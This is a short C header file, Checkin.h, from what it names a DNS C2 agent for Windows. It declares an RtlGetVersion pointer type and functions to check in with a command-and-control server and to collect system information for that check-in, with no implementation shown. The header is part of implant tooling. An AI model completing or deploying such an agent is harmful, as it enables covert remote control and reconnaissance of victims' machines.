/**
 * Checkin.h - Initial check-in for DNS C2 Agent
 */

 #ifndef CHECKIN_H
 #define CHECKIN_H
 
 #include <windows.h>

 typedef LONG (WINAPI *RtlGetVersionPtr)(PRTL_OSVERSIONINFOEXW);
 
 // Perform initial check-in with the C2 server
 BOOL perform_checkin();
 
 // Get system information for check-in
 char* get_system_info();
 
 #endif // CHECKIN_H
 